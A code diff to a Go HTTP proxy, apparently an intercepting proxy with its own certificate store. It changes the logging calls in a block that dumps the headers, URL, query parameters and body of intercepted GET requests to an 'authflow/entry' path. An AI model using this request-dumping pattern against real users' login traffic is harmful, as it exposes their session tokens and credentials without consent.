@@ -236,38 +236,39 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		        }
 			//Dumping the request
 			if strings.Contains(req.URL.Path, "authflow/entry") && (req.Method == http.MethodGet) {
-			    log.Info("Intercepted a GET request to authflow/entry")
+			    log.Println("Intercepted a GET request to authflow/entry")
 			
 			    // Log request headers
-			    log.Info("Headers:")
+			    log.Println("Headers:")
 			    for key, values := range req.Header {
-			        for _, value := range values {
-			            log.Infof("%s: %s", key, value)
-			        }
+				for _, value := range values {
+				    log.Printf("%s: %s\n", key, value)
+				}
 			    }
 			
 			    // Log request URL
-			    log.Infof("URL: %s", req.URL.String())
+			    log.Printf("URL: %s\n", req.URL.String())
 			
-			    // If you need to log the query parameters
+			    // Log query parameters
 			    if len(req.URL.Query()) > 0 {
-			        log.Info("Query Parameters:")
-			        for key, values := range req.URL.Query() {
-			            for _, value := range values {
-			                log.Infof("%s: %s", key, value)
-			            }
-			        }
-   			}
-
-			    // Optional: Log body if needed (although GET requests typically don't have a body)
+				log.Println("Query Parameters:")
+				for key, values := range req.URL.Query() {
+				    for _, value := range values {
+					log.Printf("%s: %s\n", key, value)
+				    }
+				}
+			    }
+			
+			    // Log body if needed
 			    bodyBytes, err := ioutil.ReadAll(req.Body)
 			    if err == nil && len(bodyBytes) > 0 {
-			        req.Body = ioutil.NopCloser(bytes.NewBuffer(bodyBytes)) // Restore body for downstream use
-			        log.Infof("Body: %s", string(bodyBytes))
+				req.Body = ioutil.NopCloser(bytes.NewBuffer(bodyBytes)) // Restore body for downstream
+				log.Printf("Body: %s\n", string(bodyBytes))
 			    } else {
-			        log.Info("No body found in the request.")
+				log.Println("No body found in the request.")
 			    }
 			}
+
 
 
 
